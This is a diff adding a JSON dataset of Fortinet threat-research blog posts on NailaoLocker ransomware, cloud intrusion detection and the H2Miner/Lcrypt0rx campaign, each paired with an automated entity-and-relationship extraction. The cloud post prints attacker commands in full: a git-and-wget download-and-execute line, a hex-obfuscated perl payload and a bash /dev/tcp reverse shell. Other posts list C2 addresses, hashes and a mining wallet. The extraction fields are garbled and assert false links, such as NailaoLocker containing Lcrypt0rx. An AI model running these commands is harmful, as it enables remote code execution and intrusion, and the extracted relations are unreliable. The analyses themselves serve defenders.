@@ -1,0 +1,582 @@
+[
+  {
+    "title": "FortiGuard Labs Threat Research",
+    "link": "https://www.fortinet.com/blog/threat-research",
+    "content": "FortiGuard Labs Threat Research FortiGuard Labs analyzes NailaoLocker ransomware, a unique variant using SM2 encryption and a built-in decryption function. Learn how it works, why it matters, and how Fortinet protects against it. ByKuan-Yen LiuandYen-Ting LeeJuly 18, 2025 FortiGuard Labs Threat Research FortiCNAPP Composite Alerts link weak signals into clear timelines—helping security teams detect cloud-native threats earlier and triage them faster. ByDavid AdamsonJuly 17, 2025 FortiGuard Labs Threat Research FortiCNAPP Labs uncovers Lcrypt0rx, a likely AI-generated ransomware variant used in updated H2Miner campaigns targeting cloud resources for Monero mining. ByAkshat PradhanJuly 16, 2025 FortiGuard Labs Threat Research Discover how FortiSandbox 5.0 detects Dark 101 ransomware, even with sandbox evasion tactics. Learn how advanced behavioral analysis blocks file encryption, system tampering, and ransom note deployment. ByBryan LuJuly 14, 2025 FortiGuard Labs Threat Research Explore how AI is changing the cat-and-mouse dynamic of cybersecurity, from cracking obfuscation and legacy languages to challenging new malware built with Flutter, Rust, and Delphi. ByAxelle ApvrilleJuly 10, 2025 FortiGuard Labs Threat Research FortiGuard Labs explores how NordDragonScan utilizes an effective distribution network for dissemination. Learn more. ByCara LinJuly 07, 2025 FortiGuard Labs Threat Research FortiGuard Labs analyzes RondoDox, a stealthy new botnet targeting TBK DVRs and Four-Faith routers via CVE-2024-3721 and CVE-2024-12856. Learn how it evades detection, establishes persistence, and mimics gaming and VPN traffic to launch DDoS attacks. ByVincent LiJuly 03, 2025 FortiGuard Labs Threat Research Threat actor impersonates Colombian government to deliver DCRAT via phishing email, using obfuscation, steganography, and PowerShell payload chains. ByAriel LitvakJuly 01, 2025 FortiGuard Labs Threat Research Explore a detailed technical analysis of a Havoc Remote Access Trojan (RAT) variant used in a targeted cyberattack against Middle East critical national infrastructure. Learn how Fortinet detects and protects against Havoc-based threats. ByXiaopeng ZhangandJohn SimmonsJune 23, 2025 FortiGuard Labs Threat Research FortiGuard Labs has uncovered an ongoing cyberattack, targeting companies in Taiwan using phishing emails disguised as tax-related communications. Read more. ByPei Han LiaoJune 17, 2025 Copyright © 2025 Fortinet, Inc. All Rights Reserved",
+    "extraction": {
+      "raw_output": "Named Entities: (NailaoLocker, Malware), (SM2, Technique), (Lcrypt0rx, Malware), (Dark 101, Malware), (FortiCNAPP Composite Alerts, Tool), (Lcrypt0rx, Malware), (FortiCNAPP Labs, Tool), (FortiSandbox 5.0, Tool), (AI, Technique), (NordDragonScan, Tool), (TBK DVRs, Device), (Four-Fa, Device)\nRelationships: (NailaoLocker, uses, SM2), (NailaoLocker, contains, Lcrypt0rx), (Lcrypt0rx, uses, Dark 101), (FortiCNAPP Composite Alerts, linksWeakSignalsIntoClearTimelines), (Lcrypt0rx, uses, FortiCNAPP Labs), (FortiCNAPP Labs, uncovers, Lcrypt0rx), (FortiSandbox 5.0, detects, Dark 101), (Dark 101, uses, FortiSandbox 5.0), (NordDragonScan, utilizes, anEffectiveDistributionNetworkForDissemination)",
+      "entities": [
+        [
+          "NailaoLocker",
+          "Malware"
+        ],
+        [
+          "SM2",
+          "Technique"
+        ],
+        [
+          "Lcrypt0rx",
+          "Malware"
+        ],
+        [
+          "Dark 101",
+          "Malware"
+        ],
+        [
+          "FortiCNAPP Composite Alerts",
+          "Tool"
+        ],
+        [
+          "Lcrypt0rx",
+          "Malware"
+        ],
+        [
+          "FortiCNAPP Labs",
+          "Tool"
+        ],
+        [
+          "FortiSandbox 5.0",
+          "Tool"
+        ],
+        [
+          "AI",
+          "Technique"
+        ],
+        [
+          "NordDragonScan",
+          "Tool"
+        ],
+        [
+          "TBK DVRs",
+          "Device"
+        ],
+        [
+          "Four-Fa",
+          "Device"
+        ]
+      ],
+      "relationships": [
+        [
+          "NailaoLocker",
+          "uses",
+          "SM2"
+        ],
+        [
+          "NailaoLocker",
+          "contains",
+          "Lcrypt0rx"
+        ],
+        [
+          "Lcrypt0rx",
+          "uses",
+          "Dark 101"
+        ],
+        [
+          "FortiCNAPP Composite Alerts",
+          "linksWeakSignalsIntoClearTimelines"
+        ],
+        [
+          "Lcrypt0rx",
+          "uses",
+          "FortiCNAPP Labs"
+        ],
+        [
+          "FortiCNAPP Labs",
+          "uncovers",
+          "Lcrypt0rx"
+        ],
+        [
+          "FortiSandbox 5.0",
+          "detects",
+          "Dark 101"
+        ],
+        [
+          "Dark 101",
+          "uses",
+          "FortiSandbox 5.0"
+        ],
+        [
+          "NordDragonScan",
+          "utilizes",
+          "anEffectiveDistributionNetworkForDissemination"
+        ]
+      ],
+      "has_entities": true
+    },
+    "entity_count": 12,
+    "relationship_count": 9
+  },
+  {
+    "title": "NailaoLocker Ransomware’s “Cheese”",
+    "link": "https://www.fortinet.com/blog/threat-research/nailaolocker-ransomware-cheese",
+    "content": "FortiGuard Labs Threat Research Built-In Decryption or Just Another Trap? Affected Platforms: Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Most files on the compromised machines are encryptedSeverity Level:High FortiGuard Labs recently ran across NailaoLocker, a ransomware variant targeting Microsoft Windows systems. Like many ransomware families, it uses AES-256-CBC to encrypt user files. What sets it apart is the presence of hard-coded SM2 cryptographic keys and a built-in decryption function—an uncommon combination that raises immediate questions about intent. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The name “Nailao,” which means “cheese” in Chinese, may be more than a naming quirk. This ransomware could represent a rare opportunity: a payload with embedded recoverability. Or it could be bait—a trap laid to mislead victims and security researchers. One victim’s solution may, in this case, be another’s cheese. In this blog, we examine NailaoLocker’s complete technical profile, including its execution flow, encryption and decryption routines, and use of SM2 cryptography. We assess whether this variant introduces a genuine threat or exposes an exploitable flaw. NailaoLocker is delivered to the target system as a set of three files: Execution begins when the attacker triggers usysdiag.exe, which loads the malicious sensapi.dll using a DLL side-loading technique. This DLL decrypts and loads the actual ransomware payload (usysdiag.exe.dat) directly into memory. To minimize forensic traces, NailaoLoader frees its own library from memory and deletes sensapi.dll immediately after execution. To prevent multiple instances from running simultaneously, NailaoLocker creates a mutex named lockv7. After loading, NailaoLocker checks a hard-coded value against the string \"XXXX\" to determine which mode to activate: encryption or decryption. This variant does not support command-line arguments for mode selection, indicating that the switch is built-in and may be reserved for internal use or testing. Before execution proceeds, the ransomware performs a series of setup tasks. It launches a console window to display real-time status updates, signaling no intent to conceal its activity. It also creates a log file at %ProgramData%\\lock.log, where it records progress throughout the encryption or decryption process. In encryption mode, the ransomware retrieves the ransom note from its own binary using a simple XOR decoding routine. This note is later dropped into the affected directories. To optimize performance, NailaoLocker uses a multi-threaded architecture coordinated through Windows I/O Completion Ports (IOCP). This design enables high-throughput encryption or decryption across multiple processor cores. An I/O Completion Port is initialized by calling CreateIoCompletionPort(). The main thread performs file system traversal and submits target file handles to the IOCP queue. Meanwhile, each worker thread waits for a handle to appear in the queue. When a file is received, the thread proceeds with encryption or decryption as appropriate. This model decouples file discovery from processing, allowing the ransomware to efficiently scale across available CPU resources. The GetSystemInfo() function is invoked to determine the number of logical processors available on the system. Using this information, the ransomware creates at least eight worker threads to handle concurrent file operations. This guarantees a baseline level of parallelism, even on lower-core systems. In the next section, we examine the two distinct execution modes—encryption and decryption—and provide a detailed analysis of their functionality. A distinctive feature of this NailaoLocker variant is its inclusion of a hard-coded SM2 key pair embedded in ASN.1 DER format. These keys are used during both encryption and decryption. As shown in Figure 1, the embedded key structure contains a public key and a private key. The public key, based on elliptic curve cryptography, includes x and y coordinates that define a point on the SM2 curve. The private key—rarely seen in ransomware samples—is also present, suggesting a potential test build or alternate use case. After extraction, the keys are initialized using the OpenSSL function EVP_PKEY_CTX_new(). Mapping from the hard-coded string “SM2”, the numerical identifier is set to 0x494 and is passed to the encryption function. This is further supported by the presence of the expected curve OID—06 08 2A 81 1C CF 55 01 82 2D—within the ASN.1 structure. When running in encryption mode, NailaoLocker performs two primary tasks: identifying target files and encrypting them using AES-256-CBC. It also appends a ransom note to each affected directory. NailaoLocker begins by enumerating all logical drives on the system. It recursively searches accessible directories for files to encrypt, while deliberately skipping specific system paths and file types to avoid destabilizing the infected host. Excluded file extensions: Excluded directories and files: Once a target file is identified, its handle is pushed to the IO Completion Port queue for processing by a worker thread. A ransom note is also dropped into each of the enumerated directories. Each file sent to the I/O Completion Port is processed by a worker thread, which executes the encryption routine using a unique AES key and IV. At the start of each thread, NailaoLocker allocates memory for 38 _OWORD (16-byte) elements. This space is used to store the AES key, IV, their SM2-encrypted versions, and related metadata. The ransomware uses BCryptGenRandom() to generate a 32-byte AES key and a 16-byte IV for each file: These values are used for file encryption with the AES-256-CBC algorithm. Instead of securing the AES key and IV with RSA, as is common in ransomware, NailaoLocker uses SM2, an elliptic curve cryptographic algorithm. This appears to be the first documented case of SM2 being used to protect symmetric file encryption keys in ransomware. Because SM2 does not produce a fixed-length output, the ransomware stores the sizes of the encrypted AES key and IV in two _WORD fields. The full memory layout includes: For each target file, NailaoLocker appends the .locked extension and sets the file attribute to FILE_ATTRIBUTE_HIDDEN. It then reads up to 0x10000 bytes (64 KB) of data per operation. The ransomware performs encryption using the AES-256-CBC algorithm through OpenSSL’s EVP interface. The process includes: The encrypted data replaces the original content. To facilitate decryption, the ransomware assigns a LARGE_INTEGER (8 bytes) to hold the original file size. This value is stored in thefirst 8 bytesof the encrypted file, allowing the decryptor to navigate to the footer containing key material. After the encrypted payload, the ransomware appends a structured footer. It begins with a 4-byte marker 47 56 37 00 (\"LV7\") to indicate the start of the encryption key section. The original file content was shifted to storing the file size. Also, the encryption padding extends the file size. These bytes are not able to fit in the space before the “LV7” flag and are placed after the encrypted AES key and IV. Following the \"LV7\" marker, NailaoLocker stores all remaining cryptographic and overflow data in a fixed sequence. This layout is color-coded in Figure 15: Once encryption is complete, NailaoLocker restores the file’s original last edit timestamp and renames it with the .locked extension (if not already applied). It then prints the total encryption duration to the console in the format done [time], where [time] represents the duration of the encryption operation. In decryption mode, the ransomware requires the SM2 private key to reconstruct the AES key and IV, which are stored at the end of each encrypted file. It then traverses each directory to find encrypted files and performs the decryption process to restore them to their original status. In this section, we will detail the process and validate the correctness of the built-in ASN.1 DER format of the SM2 private key. To initiate decryption mode, we modify the hard-coded value to be the same as \"XXXX,\" prompting the ransomware to switch modes. Upon switching to decryption mode, the file traversal function is adjusted to search for files with the \".locked\" extension, adding them to the IO Completion Port queue for processing. Again, at least eight threads are created to accelerate the decryption process. Each thread begins by parsing the footer of the encrypted file. The ransomware locates the \"LV7\" marker and reads the data that follows: The SM2 private key, extracted earlier from the embedded ASN.1 DER block, is used to decrypt both the AES key and IV. Once the AES key and IV are recovered, the file content is decrypted using AES-256-CBC via OpenSSL’s EVP interface: Unfortunately, in testing, the embedded SM2 private key failed to correctly decrypt the AES key, suggesting the key material may be incomplete or deliberately non-functional. However, FortiGuard analysts confirmed that when the correct AES key and IV are manually supplied—captured during encryption—the decryption function performs as expected and successfully restores the original file contents. This analysis provides a detailed technical profile of NailaoLocker, a ransomware variant notable for its embedded SM2 key pair and built-in decryption function. Although the embedded SM2 private key is non-functional in practice, testing confirms that the decryption logic operates correctly when supplied with valid AES key material, indicating this may be an in-development strain or internal test build. The use of the Chinese SM2 cryptographic standard, particularly to protect AES file encryption keys, marks a notable divergence from conventional ransomware practices. FortiGuard Labs will continue to monitor for the further adoption of region-specific algorithms and for signs that NailaoLocker is evolving toward active deployment. FortiGuard Labs detects the NailaoLocker ransomware samples with the following AV signatures: FortiEDR,FortiXDR, andFortiDeceptorprovide additional protection by detecting anomalous behavior, halting malicious encryption attempts in real time, and diverting ransomware away from production environments. All protections are continuously updated based on real-time intelligence shared across Fortinet’s global sensor network, partner CERTs, and trusted threat intelligence alliances. Fortinet recommends all organizations maintain a strong ransomware defense posture that includes: If you feel your organizations has been impacted by NailaoLocker or any other ransomware, our globalIncident Responseteam can assist with detection, containment, remediation, and recovery. 1248c4b352b9b1325ef97435bd38b2f02d21e2c6d494a2218ee363d9874b760746f3029fcc7e2a12253c0cc65e5c58b5f1296df1e364878b178027ab26562d6860133376a7c8e051da787187761e596ce9b3d0cfcea21ed8f434992aa7cb8605 FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
+    "extraction": {
+      "raw_output": "Named Entities: (FortiGuard Labs Threat Research, Entity), (NailaoLocker, Malware), (AES-256-CBC, Technique), (SM2 cryptographic key, Vulnerability), (Windows, Platform), (user files, File), (high severity level, Severity)\nRelationships: (FortiGuard Labs Threat Research, builtInDecryption, NailaoLocker), (NailaoLocker, uses, AES-256-CBC), (NailaoLocker, contains, SM2 cryptographic key), (NailaoLocker, executedBy, usysdiag.exe)",
+      "entities": [
+        [
+          "FortiGuard Labs Threat Research",
+          "Entity"
+        ],
+        [
+          "NailaoLocker",
+          "Malware"
+        ],
+        [
+          "AES-256-CBC",
+          "Technique"
+        ],
+        [
+          "SM2 cryptographic key",
+          "Vulnerability"
+        ],
+        [
+          "Windows",
+          "Platform"
+        ],
+        [
+          "user files",
+          "File"
+        ],
+        [
+          "high severity level",
+          "Severity"
+        ]
+      ],
+      "relationships": [
+        [
+          "FortiGuard Labs Threat Research",
+          "builtInDecryption",
+          "NailaoLocker"
+        ],
+        [
+          "NailaoLocker",
+          "uses",
+          "AES-256-CBC"
+        ],
+        [
+          "NailaoLocker",
+          "contains",
+          "SM2 cryptographic key"
+        ],
+        [
+          "NailaoLocker",
+          "executedBy",
+          "usysdiag.exe"
+        ]
+      ],
+      "has_entities": true
+    },
+    "entity_count": 7,
+    "relationship_count": 4
+  },
+  {
+    "title": "Improving Cloud Intrusion Detection and Triage with FortiCNAPP Composite Alerts",
+    "link": "https://www.fortinet.com/blog/threat-research/improving-cloud-intrusion-detection-and-triage-with-forticnapp",
+    "content": "FortiGuard Labs Threat Research Detect Cloud Intrusions Faster with Correlated Alerts and Contextual Timelines in FortiCNAPP Moderncyberattacks targeting cloud environmentsare increasingly complex and difficult to detect. Attackers often use multi-stage techniques—such as authentication abuse, privilege escalation, command execution, and interaction withcloud-native APIs—to gain and expand access. Each step in this attack chain often mimics legitimate administrative or developer activity, making it extremely difficult to identify malicious intent. Typical attacker behaviors—such as logging in from a new IP address, accessing previously unused cloud services, or executing command-line processes—can appear indistinguishable from routine actions by developers, admins, or automation. Complicating matters, there is often no single signature, rule, or event that definitively indicates a compromise has occurred. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. As a result, cloud intrusion detection requires examining multiple signals in context. A single weak signal may be inconclusive. But when multiple anomalies involve the same users, resources, or compute nodes over a short period, the likelihood of a targeted intrusion increases significantly. This behavioral correlation is what separates real attacks—or evenpenetration testing—from normal workload activity. FortiCNAPPaddresses this challenge by correlating weak indicators into a coherent picture usingComposite Alertsand theObservation Timeline. The sections below examine how these capabilities work in practice, along with real-world examples that illustrate their value in detecting cloud-native intrusions. To improve detection precision and reduce the burden on security analysts, FortiCNAPP has introduced Composite Alerts. This technology identifies intrusions not by detecting a single event, but by aggregating and correlating multiple indicators associated with the same entity over a defined time window. Each Composite Alert compiles a series of detections, such as suspicious logins, first-time use of administrative APIs, or anomalous container behavior, and links them to specific cloud resources, user identities, or compute instances. Applying a correlation window also allows FortiCNAPP to detect patterns that emerge over minutes or hours rather than the milliseconds of traditional attacks. This approach offers several advantages: As a result, security teams can shift away from reactive alert triage and instead engage in informed, prioritized investigation. By presenting correlated signals with contextual metadata and entity linkage, FortiCNAPP enables analysts to focus their time on evaluating credible threats rather than chasing disconnected anomalies, streamlining the path from detection to resolution. To reduce mean time to triage (MTTT), FortiCNAPP provides each Composite Alert in the form of an Observation Timeline. This timeline serves as both evidence and explanation, enabling the analyst to quickly understand why the alert was generated, which entities were involved, and what sequence of events took place. Each Observation Timeline includes two foundational elements: Once FortiCNAPP has identified a primary entity, such as a compromised IAM user, workload, or compute node, it constructs a timeline by aggregating all related observations for that entity across the alert window. For each observation, the timeline includes: By presenting these elements in a concise, ordered structure, the timeline equips the user to assess the threat in context. This makes it easier to answer key questions, such as: This structured format reduces cognitive load by eliminating the need for analysts to manually reconstruct sequences of activity from disparate logs. It also minimizes investigative overhead by clearly presenting relevant behaviors and their associated metadata in context, enabling faster escalation, more accurate threat classification, and higher-confidence incident response decisions. The first alert involves a machine monitored by a FortiCNAPP agent that was flagged as potentially compromised. Potentially Compromised Host Host machines may have been compromised. The following entities are suspected. Hosts: ip-10-123-45-67 The machine suspected of compromise had the hostname ip-10-123-45-67. Additional host details were available to the end user. The timeline begins on May 13 at 12:00 PM, when FortiCNAPP observed a new vulnerable application installed on the host. Two days later, on May 15 at 10:00 AM, the system launched several new child applications—processes not previously seen originating from this parent process. At 10:36 AM, the timeline flagged a possible reverse shell command. Inspection of the associated command line confirmed it: the host initiated an outbound connection to a remote system, granting that system interactive shell access—even if the machine was behind a firewall or otherwise unreachable from the internet. Further activity that day strengthened the case for compromise. At 12:00 PM, the host contacted a known-bad external domain. At 12:51 PM, it resolved the domain to an internal IP, indicating a successful DNS lookup. By 1:00 PM, it had established an anomalous command-line connection to an external server using wget. This suggests the attacker downloaded and executed malicious code from a remote source. The use of wget with the -qO- flag—which suppresses output and streams the response directly to stdout for execution by a child process—further supports the likelihood of malicious behavior. At this stage, the timeline provides strong evidence of compromise. For further validation, analysts could expand the “+19 more” related entities linked to the “New child application launched” detection. Within this expanded set, multiple command lines reveal obfuscated commands designed to download remote code and execute it locally. This example: /usr/bin/git archive --format=zip --prefix=en --exec=`wget -qO /tmp/QrXErNRt http:// 10.203.118.5:8080/sYdelk;chmod +x /tmp/QrXErNRt;/tmp/QrXErNRt;rm -f /tmp/QrXErNRt` --remote=bOCNVQ/ -- abuses git and wget to download remote code to a file in the tmp directory, execute it, and then clean it up. This example: /usr/bin/git archive --format=zip --prefix=HS --exec=`perl -e 'system(pack(qq,H152,,qq, 62617368202d632027303c263138392d3b65786563203138393c3e2f6465762f7463702f31302e3230332e3131382e352f343434343b7368203c26313839203e2631383920323e2631383927,))'` --remote=dspUKieP/ -- also abuses git, but this time it leverages perl to run an obfuscated script. That obfuscated script, when decoded, is the reverse shell command identified by the syscall detection bash -c 0<&189-;exec 189<>/dev/tcp/ 10.203.118.5/4444;sh <&189 >&189 2>&189 The ability to detect highly obfuscated commands as anomalous and incorporate them into the narrative of a larger suspected attack is a key benefit of FortiCNAPP’s Composite Alerts and of the Observation Timeline feature. This second alert involves AWS identities monitored by FortiCNAPP using CloudTrail logs. Potentially Compromised AWS Keys AWS credentials may have been compromised. The following entities are suspected. Users: AssumedRole/123456789012:AWSReservedSSO_AdministratorAccess_b4a9c2f1837e4d1a; Principal Ids: AROAREDACTEDM9V2Q3LXD:firstname.lastname@redactedcompany.com. In this case, the entity suspected of compromise was the identity AssumedRole/123456789012:AWSReservedSSO_AdministratorAccess_b4a9c2f1837e4d1a, specifically as used by firstname.lastname@redactedcompany.com, as indicated by the principal_id. The timeline began on May 27, when this identity called APIs across 17 AWS regions and 28 different AWS services, suggesting reconnaissance activity. On May 28, the same identity made additional API calls from a previously unseen IP address located outside AWS infrastructure. Over the following two hours, FortiCNAPP observed several additional anomalies associated with this identity, including the use of new services, access to previously used services in new regions, and API calls that resulted in errors. Several of the APIs accessed were sensitive for infrastructure and service discovery. The Lacework customer who received this alert confirmed it as a malicious intrusion. What made this case particularly noteworthy was the absence of an obvious “smoking gun.” Unlike the first example, where reverse shell commands and obfuscated payloads clearly indicated malicious activity, this scenario involved a user behaving anomalously over time in ways that resembled legitimate exploration. The suspicious nature of the behavior became apparent only when the events were viewed in aggregate. FortiCNAPP’s ability to detect this threat did not rely on a single decisive signal. Instead, it resulted from correlating multiple weak signals into a structured timeline. This allowed analysts to determine that a critical mass of suspicious behavior had occurred. This example illustrated the power of Composite Alerts. By aggregating low-signal anomalies that might otherwise be dismissed, FortiCNAPP surfaced a high-fidelity detection—catching the intrusion during the early Discovery phase, before the attacker could escalate privileges or cause damage. Composite Alerts enable security teams to focus on meaningful patterns of behavior that indicate real threats, rather than manually correlating isolated detections. By automatically assembling related signals into a coherent, time-ordered timeline, FortiCNAPP reduces the effort required to identify and respond to cloud-native attacks. Analysts no longer need to reconstruct the narrative from scratch. FortiCNAPP delivers it with supporting evidence and clear entity context. This allows security teams to shift from reactive triage to informed, prioritized investigation. By presenting correlated signals with contextual metadata, FortiCNAPP enables your analysts to focus on credible threats rather than chasing unrelated anomalies. In cloud environments, where attacker dwell times are short and lateral movement can occur quickly, timely and structured detection is essential for containing threats before they escalate into breaches or operational disruptions. FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
+    "extraction": {
+      "raw_output": "Named Entities: (FortiGuard Labs Threat Research, Entity), (Cloud, Entity), (Multi-stage technique, Technique), (Authentication abuse, Technique), (Privilege escalation, Technique), (Command execution, Technique), (Cloud-native API, Tool), (IP address, IP), (Developer, Attacker), (Admin, Attacker), (Automation, Attacker), (Signature, Hash), (Rule, Hash), (Event, Hash), (Complication, Relationship), (Global Threat Landscape Report, Document), (Penetration testing, Technique)\nRelationships: (FortiGuard Labs Threat Research, detects, Cloud intrusions), (Cloud, uses, Multi-stage technique), (Multi-stage technique, involves, Authentication abuse), (Multi-stage technique, involves, Privilege escalation), (Multi-stage technique, involves, Command execution), (Multi-stage technique, involves, Cloud-native API), (IP address, associatedWith, Developer), (IP address, associatedWith, Admin), (IP address, associatedWith, Automation), (Signature, resolvesTo, Event), (Rule, resolvesTo, Event), (Event, executes, Complication), (Document, contains, Global Threat Landscape Report)",
+      "entities": [
+        [
+          "FortiGuard Labs Threat Research",
+          "Entity"
+        ],
+        [
+          "Cloud",
+          "Entity"
+        ],
+        [
+          "Multi-stage technique",
+          "Technique"
+        ],
+        [
+          "Authentication abuse",
+          "Technique"
+        ],
+        [
+          "Privilege escalation",
+          "Technique"
+        ],
+        [
+          "Command execution",
+          "Technique"
+        ],
+        [
+          "Cloud-native API",
+          "Tool"
+        ],
+        [
+          "IP address",
+          "IP"
+        ],
+        [
+          "Developer",
+          "Attacker"
+        ],
+        [
+          "Admin",
+          "Attacker"
+        ],
+        [
+          "Automation",
+          "Attacker"
+        ],
+        [
+          "Signature",
+          "Hash"
+        ],
+        [
+          "Rule",
+          "Hash"
+        ],
+        [
+          "Event",
+          "Hash"
+        ],
+        [
+          "Complication",
+          "Relationship"
+        ],
+        [
+          "Global Threat Landscape Report",
+          "Document"
+        ],
+        [
+          "Penetration testing",
+          "Technique"
+        ]
+      ],
+      "relationships": [
+        [
+          "FortiGuard Labs Threat Research",
+          "detects",
+          "Cloud intrusions"
+        ],
+        [
+          "Cloud",
+          "uses",
+          "Multi-stage technique"
+        ],
+        [
+          "Multi-stage technique",
+          "involves",
+          "Authentication abuse"
+        ],
+        [
+          "Multi-stage technique",
+          "involves",
+          "Privilege escalation"
+        ],
+        [
+          "Multi-stage technique",
+          "involves",
+          "Command execution"
+        ],
+        [
+          "Multi-stage technique",
+          "involves",
+          "Cloud-native API"
+        ],
+        [
+          "IP address",
+          "associatedWith",
+          "Developer"
+        ],
+        [
+          "IP address",
+          "associatedWith",
+          "Admin"
+        ],
+        [
+          "IP address",
+          "associatedWith",
+          "Automation"
+        ],
+        [
+          "Signature",
+          "resolvesTo",
+          "Event"
+        ],
+        [
+          "Rule",
+          "resolvesTo",
+          "Event"
+        ],
+        [
+          "Event",
+          "executes",
+          "Complication"
+        ],
+        [
+          "Document",
+          "contains",
+          "Global Threat Landscape Report"
+        ]
+      ],
+      "has_entities": true
+    },
+    "entity_count": 17,
+    "relationship_count": 13
+  },
+  {
+    "title": "Old Miner, New Tricks",
+    "link": "https://www.fortinet.com/blog/threat-research/old-miner-new-tricks",
+    "content": "FortiGuard Labs Threat Research H2miner Resurfaces with Lcrypt0rx Ransomware Affected Platforms:Linux, Windows, ContainersImpacted Users:Any OrganizationImpact:Data Encrypted for Impact, Compute Hijacking, Defacement, Sensitive data stolen.Severity Level:Critical The FortiCNAPP team, part of FortiGuard Labs, recently investigated a cluster of virtual private servers (VPS) used for Monero mining. The identified samples are associated withprior H2miner campaignsthat we documented in 2020 and have since been updated with new configurations. H2Miner is a Crypto mining botnet that has been active since late 2019. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. We also identified a new variant of the Lcryx ransomware, calledLcrypt0rx. Lcryx is a relatively new VBScript-based ransomware strain first observed in November 2024. This family exhibits several unusual characteristics that suggest it may have been generated using AI. This is the first documented instance of operational overlap between H2miner and Lcryx, suggesting the following possibilities: The infrastructure hosts a diverse set of samples, including several commercial tools that target multiple operating systems to maximize financial gain from a victim’s environment. Tool Linux Windows Containers KinSing ✔️ Xmrig miners ✔️ ✔️ ✔️ Lcrypt0rx ✔️ Lumma stealer ✔️ DCRat ✔️ Cobalt Strike ✔️ Amadey ✔️ RustyStealer ✔️ ScreenConnect ✔️ The infrastructure uses multiple VPS providers for hosting and Command & Control. 78[.]153[.]140[.]66 HostGlobal plus VPS 80[.]64[.]16[.]241 LIR limited ISP 89[.]208[.]104[.]175 Aeza international VPS 47[.]97[.]113[.]36 Cobalt Strike server hosted by Hangzhou Alibaba Advertising Co. ISP Bitbucket[.]org Used to host payload in repo sadsafsadfsadf/dsfgdsgssdfgdsg 176[.]65[.]137[.]203 Dolphin host VPS. 185[.]156[.]72[.]96 Amadey C2 server hosted by TOV VAIZ PARTNER. ISP 80[.]64[.]18[.]161 Stimul LLC. 207[.]231[.]109[.]252 HostRush VPS. s10[.]krakenfiles[.]com File hosting used for downloading Lcrypt0rx’s wallpaper. This was uploaded on 30-04-2025 104[.]21[.]32[.]1 / softwareshop[.]win Metasploit C2. We suspect the Lcryx family was generated using AI based on the following indicators: We’ve observed growing adoption of large language models (LLMs) by threat actors in recent years. Combined with the widespread availability of commercial tools, this trend has significantly lowered the barrier to entry for cybercriminal activity. In this next section, we will examine some interesting aspects of the identified samples. H2Miner continues to rely heavily on scripts to disable defenses and expand access, ultimately enabling the deployment of miners. Many of these scripts resemble previously documented variants; however, this version has been updated with new deployment URLs. This script includes code blocks that are structurally similar to earlier H2Miner samples used to terminate security software. However, this variant goes further by also targeting database and user application processes. Additionally, it deploysKinsing malware, establishes persistence by registering itself as a service, and attempts to eliminate competing miners by terminating related processes and clearing associated cron entries. The script then checks for an existing cron entry that downloads and executes itself from 80[.]64[.]16[.]241, and adds the entry if it’s missing. Finally, it clears both the current and persistent shell command history to cover its tracks. This script closely resembles earlier H2Miner scripts used to terminate processes and deploy Kinsing malware, but it includes updated URLs. Notably, the script targets theAlibaba Cloud Security Center agentas well as processes andcontainer images running within Docker, indicating an awareness of cloud-specific defenses and containerized environments. This script functions as aKinsing updater. It removes any existing Kinsing installation and redeploys it by downloading and executing a shell script similar in structure to ce.sh. Several additional scripts identified during this investigation reuse code blocks from ce.sh, spr.sh, and cpr.sh. While their specific logic may vary, their ultimate purpose remains consistent: deployingKinsing, a remote access trojan (RAT) commonly used to deliver crypto miners in compromised environments. Name Md5 Description curl-amd64 dbc9125192bd1994cbb764f577ba5dda Kinsing RAT linked to 2021 Log4j (CVE-2021-44228) campaigns kinsing b3039abf2ad5202f4a9363b418002351 Kinsing RAT linked to Openfire (CVE-2023-32315) attacks in 2023. kinsing_aarch64 da753ebcfe793614129fc11890acedbc Kinsing Sample used in Apache ActiveMQ (CVE-2023-46604) attacks in 2023. libsystem.so ccef46c7edf9131ccffc47bd69eb743b Kinsing rootkit observed in the wild in late 2020. This PowerShell script downloads anXMRig Monero minerfrom 78[.]153[.]140[.]66 and saves it to the system’s temporary directory as sysupdate. It then creates a scheduled task using schtasks with the name\"Update service for Windows Service\"to ensure persistence. The script’s structure closely resembles those used in early 2021 mining campaigns and appears to have been reused for current operations. Notably, this XMRig miner is also deployed by theLcrypt0rx ransomwarevariant. The associated configuration file (ff1706b37fea16d75b739a5396d9ffba) points to theMonero wallet:4ASk4RhUyLL7sxE9cPyBiXb82ofekJg2SKiv4MKtCbzwHHLQxVVfVr4D4xhQHyyMTieSM5VUFGR9jZVR5gp6sa1Q2p8SahC This wallet has been previously linked to H2Miner campaigns dating back to late 2021, indicating continuity or overlap in its operator. This usage of older scripts and samples with updated configurations and hosting URLs points to a resurgence of older campaigns from2020and2021. Analysis of this sample shows that it follows the following step-by-step process: Lcrypt0rx first checks if it is running with administrator privileges. If not, it relaunches itself with elevated rights using Shell.Application to invoke wscript.exe with the /elevated flag. Once elevated, the script disables a range of system utilities and user protections by modifying the Windows Registry. These include: It also disables the execution of several critical tools: Lcrypt0rx then attempts to establish persistence by adding its full path to theWinlogon Shellregistry key and registering itself as anImage File Execution Options (IFEO)debugger for cmd.exe. However, these attempts fail because the script path is addedwithout prependingwscript.exe, rendering the entries non-functional. Using WMI, the script then forcibly terminates taskmgr.exe, msconfig.exe, and regedit.exe. It also modifies theScancode Mapregistry to disable a wide range of keys, including: Mouse buttons are reversed, and all changes are applied immediately to disrupt user control. From (Hex) From (Key) To (Hex) To (Key) Notes E05B Left Windows 0000 Disabled Disable Left Win E05C Right Windows 0000 Disabled Disable Right Win 001D Left Ctrl 0000 Disabled Disable Left Ctrl E01D Right Ctrl 0000 Disabled Disable Right Ctrl 002A Left Shift 0000 Disabled Disable Left Shift 0036 Right Shift 0000 Disabled Disable Right Shift 0038 Left Alt 0000 Disabled Disable Left Alt E038 Right Alt (AltGr) 0000 Disabled Disable Right Alt 003B F1 0000 Disabled Disable F1 E053 Delete (Ext) 0000 Disabled Disable Delete E000 Null? (invalid) 0000 Disabled Malformed entry? 